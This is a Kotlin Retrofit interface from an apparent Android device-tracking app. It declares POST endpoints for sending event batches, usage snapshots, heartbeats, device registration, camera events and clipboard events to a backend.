package com.reskill.hacktracker.data.remote

import com.reskill.hacktracker.data.remote.dto.*
import retrofit2.Response
import retrofit2.http.Body
import retrofit2.http.POST

interface ApiService {
    @POST("events/batch")
    suspend fun sendEventBatch(@Body batch: EventBatchDto): Response<Map<String, Any>>

    @POST("usage/snapshot")
    suspend fun sendUsageSnapshot(@Body snapshot: AppUsageSnapshotDto): Response<Map<String, Any>>

    @POST("device/heartbeat")
    suspend fun sendHeartbeat(@Body heartbeat: HeartbeatDto): Response<Map<String, Any>>

    @POST("device/register")
    suspend fun registerDevice(@Body registration: DeviceRegistrationDto): Response<Map<String, Any>>

    @POST("camera/event")
    suspend fun sendCameraEvent(@Body event: CameraEventDto): Response<Map<String, Any>>

    @POST("clipboard/event")
    suspend fun sendClipboardEvent(@Body event: ClipboardEventDto): Response<Map<String, Any>>
}
